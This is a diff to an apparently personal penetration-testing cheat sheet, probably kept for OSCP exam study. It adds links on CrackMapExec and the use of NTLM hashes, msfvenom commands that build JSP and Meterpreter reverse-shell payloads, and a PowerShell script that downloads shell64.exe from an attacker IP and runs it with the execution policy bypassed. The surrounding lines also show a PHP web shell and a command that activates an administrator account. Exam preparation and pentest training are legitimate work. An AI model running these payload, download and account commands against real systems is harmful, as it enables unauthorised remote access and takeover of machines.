@@ -58,12 +58,19 @@ MS17-010
 msfvenom *replaced msfpayload in older articles*
 [Msfvenom Cheat Sheet](https://thor-sec.com/cheatsheet/oscp/msfvenom_cheat_sheet/)
 
+CrackMapExec
+[CrackMapExec - Cheatsheet](https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-cheatsheet/)
+
 ## Useful Bookmarks
-Detailed explanation on how tools/exploits work.
+How-Tos
 
 ### Windows
 [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)
 [AutoBlue](https://0xdf.gitlab.io/2019/02/22/wl-dummy.html)
+
+## Credential
+[Getting the goods with CrackMapExec: Part 1](https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html)
+[Practical Usage of NTLM Hashes](https://blog.ropnop.com/practical-usage-of-ntlm-hashes/)
 
 ### MySQL
 [GAINING A ROOT SHELL USING MYSQL USER DEFINED FUNCTIONS AND SETUID BINARIES](https://infamoussyn.wordpress.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/)
@@ -119,6 +126,17 @@ shell_exec($cmd);
 ?>
 ```
 
+WAR
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST= {IP} LPORT= {PORT} -f war > shell.war
+```
+
+EXE
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.90 LPORT=6666 -f exe -a x86 --platform win -o shell86.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= {IP} LPORT= {PORT} -f exe -a x64 --platform win -o shell64.exe
+```
+
 ## Web Shell
 PHP
 ```php
@@ -131,6 +149,17 @@ PHP
 Reset/activate account
 ```powershell
 net user administrator /active:yes password123
+```
+
+WGET Replacement on Windows (echo/append each line to a script. E.g. wget.ps1)
+```powershell
+$storageDir=$pwd
+$webclient=New-Object System.Net.WebClient
+$url="http://{IP}/shell64.exe"
+$file="shell64.exe"
+$webclient.DownloadFile($url,$file)
+
+c:\Users\Administrator\Desktop>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
 ```
 
 ## Exam related links
